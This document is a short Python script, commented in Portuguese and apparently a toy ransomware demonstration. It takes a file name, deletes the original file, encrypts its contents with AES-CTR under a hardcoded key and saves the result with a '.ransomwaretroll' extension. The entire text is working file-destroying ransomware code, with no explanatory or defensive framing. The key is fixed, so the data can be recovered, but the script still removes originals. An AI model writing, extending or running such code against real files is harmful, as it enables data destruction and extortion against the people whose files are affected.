import os
import pyaes

# Recebe o nome do arquivo do usuário
file_name = input("Digite o nome do arquivo a ser criptografado: ")

# Verificar se o arquivo existe
if os.path.exists(file_name):
    with open(file_name, "rb") as file:
        file_data = file.read()

        # Remover o arquivo original
        os.remove(file_name)

        # Chave de criptografia
        key = b"testeransomwares"
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # Salvar o arquivo criptografado
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, 'wb') as new_file:
            new_file.write(crypto_data)
        
        print(f"Arquivo '{file_name}' foi criptografado com sucesso como '{new_file_name}'.")
else:
    print("Arquivo não encontrado. Verifique o nome e o caminho do arquivo e tente novamente.")
